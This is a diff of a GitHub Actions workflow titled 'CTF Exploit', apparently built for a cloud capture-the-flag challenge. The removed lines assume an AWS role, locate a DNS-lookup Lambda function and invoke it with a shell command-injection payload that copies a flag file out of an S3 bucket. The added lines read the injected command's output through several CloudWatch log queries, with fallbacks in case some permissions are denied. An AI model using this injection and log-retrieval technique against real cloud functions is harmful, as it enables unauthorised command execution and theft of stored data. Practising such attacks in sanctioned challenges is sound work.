@@ -1,60 +1,6 @@
-name: CTF Exploit
-on: [push, workflow_dispatch]
-
-jobs:
-  pwn:
-    runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-      contents: read
-    steps:
-      - uses: actions/checkout@v4
-
-      - uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
-
-      - name: Discover Lambda function name
-        id: discover
+- name: 1) Direct log read
         run: |
-          set -e
-          FN=$(aws lambda list-functions \
-                --query 'Functions[?contains(FunctionName, `nslookup`) || contains(FunctionName, `dns`) || contains(FunctionName, `lookup`)].FunctionName | [0]' \
-                --output text)
-          if [ -z "$FN" ] || [ "$FN" = "None" ]; then
-            echo "Fallback: listing everything"
-            aws lambda list-functions --query 'Functions[].FunctionName' --output text
-            exit 1
-          fi
-          echo "Found: $FN"
-          echo "fn=$FN" >> "$GITHUB_OUTPUT"
-
-      - name: List bucket (sanity check)
-        run: aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
-
-      - name: Invoke Lambda with command injection
-        run: |
-          cat > payload.json <<'EOF'
-          {"domain":"x; aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - 2>&1"}
-          EOF
-          aws lambda invoke \
-            --function-name "${{ steps.discover.outputs.fn }}" \
-            --cli-binary-format raw-in-base64-out \
-            --payload file://payload.json \
-            --log-type Tail \
-            response.json > invoke_meta.json
-          echo "--- invoke metadata ---"
-          cat invoke_meta.json
-          echo "--- response ---"
-          cat response.json
-          echo "--- tail log (base64-decoded) ---"
-          jq -r '.LogResult' invoke_meta.json | base64 -d || true
-
-      - name: Read CloudWatch logs (belt & suspenders)
-        run: |
-          sleep 4
-          LG="/aws/lambda/${{ steps.discover.outputs.fn }}"
+          LG="/aws/lambda/nslookupv2"
           STREAM=$(aws logs describe-log-streams \
                     --log-group-name "$LG" \
                     --order-by LastEventTime --descending \
@@ -64,5 +10,30 @@ jobs:
           aws logs get-log-events \
             --log-group-name "$LG" \
             --log-stream-name "$STREAM" \
-            --limit 100 \
+            --limit 200 \
             --query 'events[*].message' --output text
+
+      - name: 2) Filter events (works even if describe-log-streams is denied)
+        if: always()
+        run: |
+          aws logs filter-log-events \
+            --log-group-name "/aws/lambda/nslookupv2" \
+            --start-time $(($(date +%s%3N) - 600000)) \
+            --query 'events[*].message' --output text
+
+      - name: 3) CloudWatch Logs Insights query
+        if: always()
+        run: |
+          QID=$(aws logs start-query \
+            --log-group-name "/aws/lambda/nslookupv2" \
+            --start-time $(( $(date +%s) - 600 )) \
+            --end-time $(date +%s) \
+            --query-string 'fields @timestamp, @message | sort @timestamp desc | limit 100' \
+            --query 'queryId' --output text)
+          sleep 5
+          aws logs get-query-results --query-id "$QID" --output text
+
+      - name: 4) List log groups/streams to sanity-check names
+        if: always()
+        run: |
+          aws logs describe-log-groups --log-group-name-prefix "/aws/lambda/nslookup" --output text
